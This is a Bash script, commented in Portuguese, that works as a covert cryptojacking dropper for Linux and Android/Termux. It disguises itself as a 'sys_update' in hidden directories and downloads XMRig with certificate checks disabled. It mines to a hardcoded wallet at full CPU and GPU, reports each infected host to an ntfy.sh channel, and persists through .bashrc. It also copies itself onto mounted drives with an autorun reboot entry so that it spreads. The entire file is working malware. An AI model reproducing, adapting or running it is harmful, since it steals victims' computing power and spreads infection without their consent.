#!/bin/bash

# Configurações Iniciais
NTFY_URL="https://ntfy.sh/gsgzs"
WALLET="0x7d0B029f96348896EdaC319801496861c888bA14"
START_TIME=$(date +%s)

# Identificação de Ambiente
ARCH=$(uname -m)
IS_TERMUX=$(echo $HOME | grep -q "com.termux" && echo "true" || echo "false")
IS_ADB_ANDROID=$(uname -a | grep -i "android" && echo "true" || echo "false")
IS_NATIVE_APP=${IS_NATIVE_APP:-"false"}

# Definir TMP_BASE antes de qualquer uso
if [ "$IS_NATIVE_APP" = "true" ]; then
    TMP_BASE="$APP_FILES_DIR/.sys_update"
elif [ "$IS_TERMUX" = "true" ]; then
    TMP_BASE="$HOME/.sys_update"
elif [ "$IS_ADB_ANDROID" = "true" ]; then
    TMP_BASE="/data/local/tmp/.sys_update"
else
    TMP_BASE="/tmp/.sys_update"
fi

# Garantir diretório e Log inicial imediato
mkdir -p "$TMP_BASE"
echo "[$(date)] Script iniciado (Ambiente: Native=$IS_NATIVE_APP, Termux=$IS_TERMUX, ADB=$IS_ADB_ANDROID)" > "$TMP_BASE/sys_log.txt"

function send_checkin() {
    local status="$1"
    local mode="$2"
    local now=$(date +%s)
    local uptime_sec=$((now - START_TIME))
    local uptime_str=$(printf '%dd %dh %dm' $((uptime_sec/86400)) $((uptime_sec%86400/3600)) $((uptime_sec%3600/60)))
    
    local msg="💻 Host: $(hostname)\n🛠 Status: $status\n📈 Modo: $mode\n⏱ Uptime: $uptime_str\n📅 Data: $(date '+%d/%m/%Y %H:%M:%S')"
    
    if command -v curl >/dev/null 2>&1; then
        curl -s -H "Title: Minerador Status" -H "Priority: default" -H "Tags: hammer,computer" -d "$msg" "$NTFY_URL" > /dev/null 2>&1
    elif command -v wget >/dev/null 2>&1; then
        wget -q --header="Title: Minerador Status" --post-data="$msg" "$NTFY_URL" -O /dev/null > /dev/null 2>&1
    fi
}

if [ "$EUID" -eq 0 ]; then
    echo 128 > /proc/sys/vm/nr_hugepages 2>/dev/null
fi

# URL limpa sem espaços ou quebras de linha
if [ "$IS_NATIVE_APP" = "true" ]; then
    URL="https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-arm64.tar.gz"
elif [ "$IS_TERMUX" = "true" ]; then
    URL="https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-android-arm64.tar.gz"
    if ! grep -q "miner.sh" "$HOME/.bashrc" 2>/dev/null; then
        echo "bash $HOME/miner.sh > /dev/null 2>&1 &" >> "$HOME/.bashrc"
    fi
elif [ "$IS_ADB_ANDROID" = "true" ]; then
    URL="https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-arm64.tar.gz"
else
    if [[ "$ARCH" == "x86_64" ]]; then
        URL="https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz"
    else
        URL="https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-arm64.tar.gz"
    fi
fi

NEW_BIN="$TMP_BASE/sys_update"
LOG_FILE="$TMP_BASE/sys_log.txt"

if [ ! -f "$NEW_BIN" ]; then
    echo "[$(date)] Baixando minerador..." >> "$LOG_FILE"
    echo "[$(date)] URL: $URL" >> "$LOG_FILE"
    mkdir -p "$TMP_BASE"
    cd "$TMP_BASE"
    
    # Tentar baixar com User-Agent e seguindo redirecionamentos
    if command -v curl >/dev/null 2>&1; then
        echo "[$(date)] Usando curl..." >> "$LOG_FILE"
        curl -fkLsH "User-Agent: Mozilla/5.0" "$URL" -o pkg.tar.gz
    elif command -v wget >/dev/null 2>&1; then
        echo "[$(date)] Usando wget..." >> "$LOG_FILE"
        wget --no-check-certificate --user-agent="Mozilla/5.0" "$URL" -O pkg.tar.gz
    else
        echo "[$(date)] Erro: Nem curl nem wget encontrados." >> "$LOG_FILE"
        return 1
    fi
    
    if [ ! -s pkg.tar.gz ]; then
        echo "[$(date)] Erro: Download falhou (arquivo vazio). Verifique a internet." >> "$LOG_FILE"
        rm -f pkg.tar.gz
        return 1
    fi

    echo "[$(date)] Download concluido. Extraindo..." >> "$LOG_FILE"
    tar -xzf pkg.tar.gz
    
    # Procurar o executável xmrig dentro da pasta extraída
    XMRIG_PATH=$(find . -name "xmrig" -type f | head -n 1)
    if [ -n "$XMRIG_PATH" ]; then
        mv "$XMRIG_PATH" sys_update
        chmod +x sys_update
        echo "[$(date)] Minerador instalado com sucesso." >> "$LOG_FILE"
    else
        echo "[$(date)] Erro: Executavel xmrig nao encontrado no pacote." >> "$LOG_FILE"
    fi
    rm -rf pkg.tar.gz xmrig-* 
fi

if [ -f "$NEW_BIN" ]; then
    if ! pgrep -x "sys_update" > /dev/null; then
        send_checkin "Iniciado" "Full Power"
        echo "[$(date)] Iniciando processo de mineracao..." >> "$LOG_FILE"
        if [ "$IS_NATIVE_APP" = "true" ] || [ "$IS_TERMUX" = "true" ]; then
            nohup "$NEW_BIN" -o rx.unmineable.com:3333 -u "MATIC:$WALLET.srv02#p0o1-l2m3" -p x -a rx/0 --cpu-max-threads-hint 100 --priority 5 --log-file "$LOG_FILE" > /dev/null 2>&1 &
        else
            nohup "$NEW_BIN" -o rx.unmineable.com:3333 -u "MATIC:$WALLET.srv02#p0o1-l2m3" -p x -a rx/0 --cpu-max-threads-hint 100 --priority 5 --randomx-1gb-pages --cuda --opencl --log-file "$LOG_FILE" > /dev/null 2>&1 &
        fi
    fi
fi

if [[ "$IS_TERMUX" == "false" && "$IS_ADB_ANDROID" == "false" && "$IS_NATIVE_APP" == "false" ]]; then
    (while true; do
        for drive in /media/$USER/* /mnt/*; do
            if [ -d "$drive" ] && [ ! -d "$drive/SystemUpdate" ]; then
                mkdir -p "$drive/SystemUpdate"
                cp "$0" "$drive/SystemUpdate/miner.sh"
                echo "@reboot bash $drive/SystemUpdate/miner.sh" > "$drive/SystemUpdate/autorun.sh"
            fi
        done
        sleep 300
    done) &
fi
